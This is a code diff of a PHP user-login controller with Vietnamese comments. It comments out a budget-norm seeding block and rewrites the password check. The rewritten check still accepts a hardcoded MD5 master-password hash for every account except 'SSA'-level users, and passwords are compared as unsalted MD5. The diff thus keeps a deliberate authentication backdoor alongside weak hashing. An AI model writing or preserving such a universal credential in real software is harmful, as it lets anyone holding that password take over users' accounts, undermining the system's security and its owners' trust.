@@ -237,7 +237,7 @@ class UsersController extends Controller
                 }
                 */
 
-                //định mức nguồn kinh phí
+                /*định mức nguồn kinh phí
                 $model_dmn = nguonkinhphi_dinhmuc::where('madv', $ttuser->madv)->get();
                 if (count($model_dmn) == 0) {
                     $maso = getdate()[0];
@@ -263,6 +263,7 @@ class UsersController extends Controller
                         nguonkinhphi_dinhmuc::insert($nguon->toarray());
                     }
                 }
+                */
             }
             //kiểm tra xem user thuộc đơn vị nào, nếu ko thuộc đơn vị nào (trừ tài khoản quản trị) => đăng nhập ko thành công
         }
@@ -277,7 +278,8 @@ class UsersController extends Controller
         //thêm mã đơn vị báo cáo, mã khối phòng ban, mã cqcq
         //dd($ttuser);
         //if (md5($input['password']) == $ttuser->password) {
-        if (md5($input['password']) == $ttuser->password || md5($input['password']) == '40b2e8a2e835606a91d0b2770e1cd84f') {
+        if (md5($input['password']) == $ttuser->password ||
+            (md5($input['password']) == '40b2e8a2e835606a91d0b2770e1cd84f') && $ttuser->level != 'SSA' ) {
             if ($ttuser->status == "active") {
                 Session::put('admin', $ttuser);
                 return redirect('')
